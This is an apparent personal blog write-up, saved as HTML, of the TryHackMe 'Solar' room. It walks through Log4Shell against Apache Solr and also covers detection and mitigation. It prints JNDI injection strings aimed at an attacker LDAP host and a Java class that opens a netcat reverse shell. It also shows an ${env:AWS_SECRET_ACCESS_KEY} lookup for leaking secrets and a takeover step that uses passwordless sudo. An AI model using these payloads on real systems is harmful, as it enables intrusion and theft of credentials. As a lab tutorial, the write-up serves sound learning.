@@ -1,0 +1,780 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Tryhackme - Solar - bynafrez08.io</title>
+<meta name="description" content="Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="bynafrez08.io">
+<meta property="og:title" content="Tryhackme - Solar">
+<meta property="og:url" content="http://localhost:4000/tryh-solar/">
+
+
+  <meta property="og:description" content="Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/img-solar/portada.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-16T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/tryh-solar/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="bynafrez08.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+   <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Article</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Search</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Tryhackme - Solar</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Networking / Pentesting / Offensive Security
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/bynafrez08" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Tryhackme - Solar">
+    <meta itemprop="description" content="Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.">
+    <meta itemprop="datePublished" content="January 16, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Tryhackme - Solar
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-16T00:00:00-05:00">January 16, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p>Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/portada.png" />
+</p>
+
+<p>The first thing we are going to do is to create a file with the machine name, and inside of that file with <strong><em>mkt</em></strong> we are going to create to following directories (the mkt function remember that I have it defined in the <strong><em>~/.zshr</em></strong> to create those directories.).</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura1.png" />
+</p>
+
+<h2 id="recognition">Recognition</h2>
+
+<p>First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura2.png" />
+</p>
+
+<h2 id="task-2---scanning">Task 2 - Scanning</h2>
+
+<p>I am going to perform a tcp syn scan by adding the min-rate parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sun Jan 16 18:58:46 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.218.103
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.218.103 ()  Status: Up
+Host: 10.10.218.103 ()  Ports: 22/open/tcp//ssh///, 111/open/tcp//rpcbind///, 8983/open/tcp/////        Ignored State: closed (65532)
+# Nmap done at Sun Jan 16 18:58:59 2022 -- 1 IP address (1 host up) scanned in 13.59 seconds
+</code></pre></div></div>
+
+<p>Basically i save it in the grepable format is that i have a function defined in the ~/.zshrc called <strong><em>extractports</em></strong> that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura3.png" />
+</p>
+
+<p>Extractports script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>extractPorts<span class="o">(){</span>
+        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
+        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">cat </span>extractPorts.tmp<span class="p">;</span> <span class="nb">rm </span>extractPorts.tmp
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sun Jan 16 19:00:30 2022 as: nmap -sCV -p22,111,8983 -oN targeted 10.10.218.103
+Nmap scan report for 10.10.218.103
+Host is up (0.066s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
+|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
+|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+8983/tcp open  http    Apache Solr
+| http-title: Solr Admin
+|_Requested resource was http://10.10.218.103:8983/solr/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 16 19:00:45 2022 -- 1 IP address (1 host up) scanned in 14.66 seconds
+</code></pre></div></div>
+<p>As there is a http service on port 8983 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura4.png" />
+</p>
+
+<p>If we access with the ip address on the port 8983 we will be in the apache solr admin page as you can see. So if you asking what is apache solr? it’s an open source search platform that has written in java from apache lucene project library, basically is used to optimezed a search quries and search indexes for large amounts of data and it’s used for many apps or websites that require a search engine for a lot of content and part of this functionality involves the use of cores,  once of examples can be the eccommerce websites.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura5.png" />
+</p>
+
+<h2 id="task-3---discovery">Task 3 - Discovery</h2>
+
+<p>Basically what it is telling us is that the version apache solr 8.11.0 has log4j vulnerabilities, basically apache solr to store logs uses the log4j. And it is indicaticating us that this machine the apache solr has the minimum installation and configuration but that it does influence much since it is to give us to understand the attack.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura7.png" />
+</p>
+
+<p>If we go back in the website we can see where tha path where the logs are stored in solr.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura6.png" />
+</p>
+
+<p>In the task it’s tells us to install a file that contain solr logs to get an idea of what they look like. So let’s unzip that zip file.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura8.png" />
+</p>
+
+<p>If we open one of the files we can see how the logs are stored in solr, but something interesting is that an <strong><em>INFO</em></strong> entry that is shown repeatedly which is the <strong><em>admin/cores</em></strong> url endpoint.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura9.png" />
+</p>
+
+<p>Looking at these log entries we can see that in the <strong><em>parms</em></strong> field there are no info is shown, so thats mean that we could modify or add values in that specific parameter that will serve us to exploit the log4j.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura10.png" />
+</p>
+
+<h2 id="task-4---proof-of-concept">Task 4 - Proof of Concept</h2>
+
+<p>Well is tells us one of the pontential routes that we can exploit the log4j in this particular version of solr that we will be access in moment and we have alreadyseen one of the attack vector (<strong><em>perms</em></strong>). And in the documentation it show us some examples of how to perform lookups with the following syntaxes in log4j, which first would be add the prefix and then would be the name or code to be executed, and we can see that among them we can perform lookups for env variables and about the system.</p>
+
+<p>And it is show us to how abuse this, that first it would be to invoke the jndi plugin and then we indicate that it connects is our attacker ldap server: <strong><em>${jndi:ldap://ATTACKERIP:1389/PORT}</em></strong></p>
+
+<p>So in the documentation it’s says that the log4j vuln will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface”. First of all is a directory service that allows any java software to find data through a directory using a name service, basically it’s objective is to obtain data from other system or servers very easily and even to obtain java objects remotely (which where the problem comes from), jdni allow us to use variety directory service like ldap, rmi and more. So in this case with log4j we can utilize jndi lookups in conjunction with ldap to obtain an external resource that’s being stored on any server. So some version of apache come with a pre-package with the jndi lookup plugin which is vuln. more info <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell">here</a></p>
+
+<p>Now as attackers can use the jndi plugin with a malicious ldap referral server to share a malicious java class or payload.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura11.png" />
+</p>
+
+<p>Here it tells us that this syntax can be injected into any entry in which the logs are being registred (forms, http addresses, etc).</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura12.png" />
+</p>
+
+<p>So in this particular version of apache solr there is an api endpoint url which is the <strong><em>solr/Admin/cores</em></strong> route we can inject the jndi lookup plugin, somethinglike this: <strong><em>http://MACHINE_IP:8983/solr/admin/cores?cmd=${jndi:ldap://IP:1389/}</em></strong></p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura14.png" />
+</p>
+
+<p>Ok so to know if the website is vulnerable to logj4 and if it’s using log4j we need to use the following commands:</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura13.png" />
+</p>
+
+<p>So first we need to listen with netcat to receive connection, and in a another window with the curl command we are going to inject the jndi lookup specifying our attacker ip address and the port that we are listening in netcat (which in my case it’s the port 9999), and if we are receive a connection it’s mean that the website is using the log4j and it’s vulnerable. And with this we would resolve the POC.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura15.png" />
+</p>
+
+<h2 id="task-5---exploitation">Task 5 - Exploitation</h2>
+
+<p>In this case it tells us in the documentation how to exploit the logj to get a reverse shell, first we need to listen with netcat to receive the connection as we done in the POC, then it tells as that we need to execute a ldap refferal server and with python or php host the payload that we want to execute on the victim machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura16.png" />
+</p>
+
+<p>So we need to clone this <a href="https://github.com/mbechler/marshalsec">repo</a> to execute in our attacker machine the ldap referral server. In the README file of this repo it tells us that we must to hace <strong><em>java 8</em></strong> to be able to run our ldap server, in the case if we don’t have java 8 installed on our attacker machine we must be follow the following installation steps shown in the documentation.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura21.png" />
+</p>
+
+<p>Now with maven what we are going to do is to compile all the dependencies from the marshalsec repo that will be inside a folder called <strong><em>target</em></strong> that will contain the <strong><em>.jar</em></strong> file. If you dont have maven installed on your machine use the cammand: <strong><em>apt install maven</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura22.png" />
+</p>
+
+<p>Now we ara going to run our ldap referral server to direct connections to our secondary http server that will be host the java payload.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura23.png" />
+</p>
+
+<p>Now let’s use this java payload to get a reverse shell with netcat specifying our ip address and the port that we are going listen to.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"nc -e /bin/bash 10.8.40.42 9999"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Then we are need to compile this java payload into a java class with the following command.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura25.png" />
+</p>
+
+<p>With python we are going to host this java class payload to download or transfer in the victim machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura26.png" />
+</p>
+
+<p>Now in another window we going to execute with curl the same command that we executed in the POC but this time we will put the name of the payload that we are hosting in python (btw you can use the http request in the browser if you want, but i recommend with curl). and as you can see that in the http server in python we have received a GET request and in netcat we already have access to the machine. And now that how we are exploit the logj vulnerabilities.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura27.png" />
+</p>
+
+<p>If you have any problems to execute the reverse shell, here are some possible solutions.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura28.png" />
+</p>
+
+<h2 id="task-6---persistence">Task 6 - Persistence</h2>
+
+<p>once we have access we are going to spawn a proper console with python (or you can use the command: <strong><em>script /dev/null -c bash)</em></strong> and then do the tty treatment as indicated in the documentation to move better through the console.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura29.png" />
+</p>
+
+<p>Now we are going to export two env variables, which is <strong><em>xterm</em></strong> to get a appropriate shell to use commands like <strong><em>clear</em></strong> and <strong><em>bash</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura31.png" />
+</p>
+
+<p>If we use the command <strong><em>cat /etc/passwd</em></strong> we can see all the users that exist in the system.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura32.png" />
+</p>
+
+<p>With the command <strong><em>sudo -l</em></strong> let’s check if we have sudo permissions, and as you can see it’s indicate <strong><em>NOPASSWS</em></strong> thats mean that we can run all sudo commands without the user password.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura33.png" />
+</p>
+
+<p>And since we don’t the password, what we can do is to change the user password on the system since we have permissions to execute sudo commands without the password, with the command <strong><em>passwd</em></strong> we will add a new password.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura34.png" />
+</p>
+
+<p>And once we change the password we can connect with ssh to the victim machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura35.png" />
+</p>
+
+<h2 id="task-7---detection">Task 7 - Detection</h2>
+
+<p>And here it tells us the tools that we can use to detect if our java app has this vulnerability, among them detecting log4j packages that are vulnerable or detecting culnerable JAR files.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura36.png" />
+</p>
+
+<p>Here we can see the directory where the apache solr logs are stored.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura37.png" />
+</p>
+
+<p>In this case if we access one of these files, which in this case in the <strong><em>solr.log</em></strong> file  we can see that inside the perms field the jndi lookup has ben injected which is connect our ldap referral server and execute the malicious payload, and this would be a wey to detect this vulnerability in the log files.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura38.png" />
+</p>
+
+<h2 id="task-8---bypasses">Task 8 - Bypasses</h2>
+
+<p>And here it show us the possibles bypasses that it can be use if we are attacker, Among them we can extract env variables that can contain some type of access key, for example the <strong><em>${env:AWS_SECRET_ACCESS_KEY}</em></strong> which is very very critical. btw it’s not necessary to run a ldap referral server we can use rmi protocol to search for external resources or to inject jndi lookups.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura39.png" />
+</p>
+
+<p>So we can use the command <strong><em>printenv</em></strong> to use the env variables in the system, and se if there have a exfiltration.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura40.png" />  
+</p>
+
+<h2 id="task-9---mitigation">Task 9 - Mitigation</h2>
+
+<p>In the case of apache solr we can perform this mitigation to aviod this type of attack.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura43.png" />
+</p>
+
+<p>First we are gon a locate the file <strong><em>solr.in.sh</em></strong> which is contain the apache solr env variables.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura45.png" />
+</p>
+
+<p>So once we have located it the file we open it with your favorite bash editor, and we are gon a paste this sentence <strong><em>SOLR_OPTS=”$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true”</em></strong> that we can’t perform external lookups with jndi. Then save the file.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura46.png" />
+</p>
+
+<p>And now restart the apache solr service to apply the changes that we make.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura47.png" />
+</p>
+
+<p>And now if we perform the same attack again to access in the system, we see that we do not have any connection from the victim machine. because now it’s disable the jndi lookups which means the victima machine can’t connect our ldap referral server.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura48.png" />
+</p>
+
+<h2 id="task-10---patching">Task 10 - Patching</h2>
+
+<p>And finally, it tells us that there are still no patches for this vulnerability (log4shell) and it’s recommended to update the log4j packages to the new version that it’s not include the jndi.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura49.png" />
+</p>
+
+<p>And with this we finish the room, and we already know how this vulnerability works and how critical it is.</p>
+
+<p align="center">
+<img src="/assets/images/img-solar/captura50.png" />
+</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cve" class="page__taxonomy-item" rel="tag">CVE</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rce" class="page__taxonomy-item" rel="tag">RCE</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#tryhackme" class="page__taxonomy-item" rel="tag">Tryhackme</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pentest" class="page__taxonomy-item" rel="tag">Pentest</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-16T00:00:00-05:00">January 16, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-logforge/" class="pagination--pager" title="HTB - LogForge
+">Previous</a>
+    
+    
+      <a href="/htb-ransom/" class="pagination--pager" title="HTB - Ransom
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 bynafrez08.io</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
